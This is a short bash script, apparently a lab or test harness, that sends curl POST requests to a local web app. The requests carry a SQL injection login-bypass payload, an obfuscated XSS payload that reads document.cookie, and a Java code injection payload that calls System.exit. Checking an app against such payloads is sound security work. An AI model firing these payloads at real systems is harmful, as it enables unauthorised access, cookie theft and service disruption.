#!/bin/bash
#SQL Injection
curl -X POST -d "name=mark&password=' OR '1'='1" http://localhost:8080/sqlijc > sql1.html
curl -X POST -d "name=Mark&password=password" http://localhost:8080/sqlijc > sql2.html

#XSS
curl -X POST -d "string= >tpircs/<;)eikooc.tnemucod(trela>tpIrcs<" http://localhost:8080/xss > xss.html

#Code Injection
curl -X POST -d "jsonString={}');java.lang.System.exit(0);//" http://localhost:8080/codeijc > codeijc.html
